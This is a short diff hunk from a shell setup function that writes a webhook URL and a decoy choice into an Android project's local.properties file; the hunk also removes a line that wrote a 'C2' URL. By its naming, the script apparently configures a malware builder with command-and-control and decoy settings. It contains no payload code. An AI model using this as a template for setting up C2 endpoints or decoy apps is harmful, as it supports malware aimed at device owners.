@@ -210,8 +210,6 @@ configure_app() {
     else
         echo "WEBHOOK_URL=$WEB_URL" >> "$PROJECT_DIR/local.properties"
     fi
-        echo "RENDER_C2_URL=$RENDER_URL" >> "$PROJECT_DIR/local.properties"
-    fi
 
     if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
